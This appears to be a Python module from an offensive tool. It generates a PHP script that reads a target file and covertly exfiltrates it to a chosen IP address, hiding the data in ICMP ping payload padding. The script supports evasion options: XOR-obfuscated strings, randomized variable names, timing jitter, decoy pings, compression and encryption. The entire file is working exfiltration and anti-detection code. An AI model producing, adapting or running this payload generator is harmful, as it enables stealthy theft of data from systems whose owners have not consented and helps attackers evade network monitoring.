import random

from ..obfuscation import xor_key, xor_encode


def _php_payload(file_path, ip, period, random_delay, randomize=False, junk=0, randomize_junk=False, compress=False, encrypt=None, passphrase='', estimate=False, obfuscate_strings=False):
    php_file = file_path.replace("\\", "\\\\").replace("'", "\\'")

    template = """<?php
$f='__FILE__';$ip='__IP__';$p=__PERIOD__;$rd=__RDELAY__;
$c=12;$ib=3;$r=5;$t=2;
$data=file_get_contents($f);
$hsh=hash('sha256',$data);
$hex=bin2hex($data);
$dsz=strlen($data);
$tot=intdiv($dsz+$c-1,$c);
if($tot>pow(2,8*$ib)){fwrite(STDERR,"[-] File too large\\n");exit(1);}
if($rd!=0){echo "[+] Sending '$f' ($dsz bytes) to '$ip' in $tot pings every ($p +- $rd) s\\n";}
elseif($p!=0){echo "[+] Sending '$f' ($dsz bytes) to '$ip' in $tot pings every $p s\\n";}
else{echo "[+] Sending '$f' ($dsz bytes) to '$ip' in $tot pings\\n";}
if($rd>$p){fwrite(STDERR,"[!] WARNING: random-delay ($rd s) > period ($p s)\\n");}
$ls=false;$t0=microtime(true);
for($i=0;$i<$tot;$i++){
$idx=sprintf('%06x',$i);
$chunk=substr($hex,$i*24,24);
$pat=$idx.$chunk;
$ok=false;
for($a=0;$a<$r;$a++){
if($ls){
if($rd!=0){$sl=$p+(lcg_value()*2-1)*$rd;if($sl<0)$sl=0;usleep((int)($sl*1000000));}
elseif($p!=0){usleep((int)($p*1000000));}
}
$ls=true;
$sz=intdiv(strlen($pat),2);
$o=[];exec("ping -c 1 -W $t -s $sz -p '$pat' '$ip' >/dev/null 2>&1",$o,$rc);
if($rc===0){$ok=true;break;}
}
if(!$ok){fwrite(STDERR,"[-] No reply for ping $i, transfer aborted\\n");exit(1);}
$s=$i+1;
if($p!=0||$rd!=0){
$el=microtime(true)-$t0;
$eh=intdiv((int)$el,3600);$em=intdiv((int)$el%3600,60);$es=(int)$el%60;
$by=$s*$c;if($by>$dsz)$by=$dsz;
$pct=intdiv(100*$s,$tot);
fprintf(STDOUT,"\\r  %d/%d pings, %d/%d bytes, %d%%, elapsed %02d:%02d:%02d",$s,$tot,$by,$dsz,$pct,$eh,$em,$es);
if($rd==0&&$s>0){
$rm=(int)($el*($tot-$s)/$s);$rh=intdiv($rm,3600);$rmm=intdiv($rm%3600,60);$rss=$rm%60;
fprintf(STDOUT,", remaining ~%02d:%02d:%02d",$rh,$rmm,$rss);}
}elseif($s%100==0){echo "  $s/$tot\\n";}
}
echo "\\n";
echo str_repeat("=",50)."\\n";
echo str_repeat(" ",21)."DONE\\n";
echo str_repeat("=",50)."\\n\\n";
echo "[*] SHA-256: $hsh\\n";
"""

    script = template
    _xor_key = None
    if obfuscate_strings:
        _xor_key = xor_key()
        key_str = ','.join(str(b) for b in _xor_key)
        decode_block = (
            "$_k=[" + key_str + "];\n"
            "$_d=function($h)use(&$_k){$r='';for($z=0;$z<strlen($h);$z+=2){$r.=chr(hexdec(substr($h,$z,2))^$_k[($z/2)%count($_k)]);}return $r;};\n"
        )
        script = script.replace(
            "$f='__FILE__';$ip='__IP__';",
            decode_block + "$f=$_d('__XFILE__');$ip=$_d('__XIP__');"
        )
    if compress:
        script = script.replace(
            "$hex=bin2hex($data);\n",
            "$osz=strlen($data);\n"
            "$data=gzencode($data);\n"
            "$csz=strlen($data);\n"
            "echo \"[*] Compressed: $osz -> $csz bytes (\".sprintf('%.1f',100.0*$csz/$osz).\"%)\\n\";\n"
            "$hex=bin2hex($data);\n"
        )
    if encrypt:
        php_pass = passphrase.replace("\\", "\\\\").replace("'", "\\'")
        if obfuscate_strings:
            pp_line = "$pp=$_d('__XPP__');\n"
        else:
            pp_line = "$pp='__PP_VALUE__';\n"
        encrypt_code = (
            pp_line +
            "$desc=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];\n"
            "$ep=proc_open(\"openssl enc -" + encrypt + " -pbkdf2 -iter 10000 -md sha256 -pass 'pass:$pp'\",$desc,$pipes);\n"
            "fwrite($pipes[0],$data);fclose($pipes[0]);\n"
            "$data=stream_get_contents($pipes[1]);fclose($pipes[1]);\n"
            "fclose($pipes[2]);proc_close($ep);\n"
            "echo \"[*] Encrypted with " + encrypt + "\\n\";\n"
        )
        script = script.replace(
            "$hex=bin2hex($data);\n",
            encrypt_code + "$hex=bin2hex($data);\n"
        )
    if junk > 0:
        script = script.replace(
            '$c=12;$ib=3;$r=5;$t=2;',
            f'$c=12;$ib=3;$r=5;$t=2;$J={junk};'
        )
        if randomize_junk:
            junk_data = "$jd='ff'.bin2hex(random_bytes(14));\n"
        else:
            junk_data = "$jd='ffffff'.bin2hex(random_bytes(12));\n"
        junk_code = (
            "for($j=0;$j<$J;$j++){\n" +
            junk_data +
            "if($ls){\n"
            "if($rd!=0){$sl=$p+(lcg_value()*2-1)*$rd;if($sl<0)$sl=0;usleep((int)($sl*1000000));}\n"
            "elseif($p!=0){usleep((int)($p*1000000));}\n"
            "}\n"
            "$ls=true;\n"
            "exec(\"ping -c 1 -W $t -s 15 -p '$jd' '$ip' >/dev/null 2>&1\");\n"
            "}\n"
        )
        script = script.replace("$s=$i+1;\n", "$s=$i+1;\n" + junk_code)
    if estimate:
        est_lines = (
            "echo \"[!] ESTIMATE OPTION ENABLED — the file will NOT be transferred\\n\";\n"
            "echo \"[*] File size (after processing): $dsz bytes\\n\";\n"
            "echo \"[*] Data pings: $tot\\n\";\n"
        )
        if junk > 0:
            est_lines += (
                "echo \"[*] Junk pings: \".($tot*$J).\"\\n\";\n"
                "echo \"[*] Total pings: \".($tot*(1+$J)).\"\\n\";\n"
            )
            total_expr = "($tot*(1+$J))"
        else:
            est_lines += "echo \"[*] Total pings: $tot\\n\";\n"
            total_expr = "$tot"
        est_lines += (
            "if($p!=0){\n"
            "$et=" + total_expr + "*$p;$h=intdiv((int)$et,3600);$m=intdiv((int)$et%3600,60);$ss=(int)$et%60;\n"
            "fprintf(STDOUT,\"[*] Estimated time: ~%02d:%02d:%02d\\n\",$h,$m,$ss);\n"
            "}\n"
            "echo \"[*] SHA-256: $hsh\\n\";\n"
            "exit(0);\n"
        )
        script = script.replace("$ls=false;$t0=microtime(true);\n", est_lines)

    if randomize:
        import re
        var_names = [
            'f', 'ip', 'p', 'rd',
            'c', 'ib', 'r', 't',
            'data', 'hsh', 'hex', 'dsz', 'tot',
            'ls', 't0', 'i', 'idx', 'chunk', 'pat', 'ok',
            'a', 'sl', 'sz', 'o', 'rc', 's',
            'el', 'eh', 'em', 'es', 'by', 'pct',
            'rm', 'rh', 'rmm', 'rss',
        ]
        if compress:
            var_names.extend(['osz', 'csz'])
        if encrypt:
            var_names.extend(['pp', 'desc', 'ep', 'pipes'])
        if junk > 0:
            var_names.extend(['J', 'j', 'jd'])
        if estimate:
            var_names.extend(['et', 'h', 'm', 'ss'])
        if obfuscate_strings:
            var_names.extend(['_k', '_d'])
        letters = 'abcdefghijklmnopqrstuvwxyz'
        alphanums = letters + '0123456789'
        php_reserved = set()
        original_names = set(var_names)
        used = set()
        mapping = {}
        for name in var_names:
            while True:
                rand_name = random.choice(letters) + ''.join(random.choices(alphanums, k=2))
                if rand_name not in used and rand_name not in php_reserved and rand_name not in original_names:
                    used.add(rand_name)
                    mapping[name] = rand_name
                    break
        for old_name in sorted(var_names, key=len, reverse=True):
            pattern = r'\$' + re.escape(old_name) + r'(?=\W|$)'
            script = re.sub(pattern, '$' + mapping[old_name], script)

    period_str = f"{period:g}"
    rdelay_str = f"{random_delay:g}"

    if obfuscate_strings:
        script = (script
                  .replace('__XFILE__', xor_encode(file_path, _xor_key))
                  .replace('__XIP__', xor_encode(ip, _xor_key))
                  .replace('__PERIOD__', period_str)
                  .replace('__RDELAY__', rdelay_str))
        if encrypt:
            script = script.replace('__XPP__', xor_encode(passphrase, _xor_key))
    else:
        script = (script
                  .replace('__FILE__', php_file)
                  .replace('__IP__', ip)
                  .replace('__PERIOD__', period_str)
                  .replace('__RDELAY__', rdelay_str))
        if encrypt:
            script = script.replace('__PP_VALUE__', php_pass)

    return script
